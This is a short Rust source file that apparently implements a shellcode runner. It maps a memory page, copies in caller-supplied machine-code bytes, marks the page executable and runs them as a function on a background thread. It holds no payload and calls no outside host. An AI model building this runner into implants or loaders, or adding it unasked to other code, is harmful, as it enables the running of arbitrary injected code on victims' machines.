use std::{ptr, thread};

use libc::{c_void, mmap, mprotect, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};
use log::{error, info};

pub fn execute(payload: &[u8]) -> Result<(), u32> {
    let payload = payload.to_vec();
    if payload.len() > 4096 {
        error!("Payload is too long! (>4096 bytes)");
        return Err(0u32);
    }
    thread::spawn({
        move || {
            let size = 4096; // Allocate 1 page of memory
            let exec_mem = create_executable_memory(size);
            info!("Executable memory allocated at: {:?}", exec_mem);

            unsafe {
                // Copy the machine code into the executable memory
                ptr::copy_nonoverlapping(payload.as_ptr(), exec_mem as *mut u8, payload.len());

                // Cast the memory address to a callable function pointer
                let func: extern "C" fn() -> u32 = std::mem::transmute(exec_mem);

                // Call the function
                let result = func();
                info!("Function executed, returned: {}", result);
            }

            // let str_payload = str::from_utf8(payload.as_slice()).unwrap();
            // info!("PAYLOAD: {}", str_payload);
        }
    });
    Ok(())
}

fn create_executable_memory(size: usize) -> *mut c_void {
    unsafe {
        // Allocate memory with mmap
        let addr = mmap(
            ptr::null_mut(),             // Let the OS choose the address
            size,                        // Size of the memory region
            PROT_READ | PROT_WRITE,      // Initially read-write
            MAP_ANONYMOUS | MAP_PRIVATE, // Anonymous private mapping
            -1,                          // No file descriptor
            0,                           // Offset
        );

        if addr == libc::MAP_FAILED {
            panic!("Failed to allocate memory");
        }

        // Mark the region as executable
        if mprotect(addr, size, PROT_READ | PROT_EXEC) != 0 {
            panic!("Failed to set memory as executable");
        }

        addr
    }
}
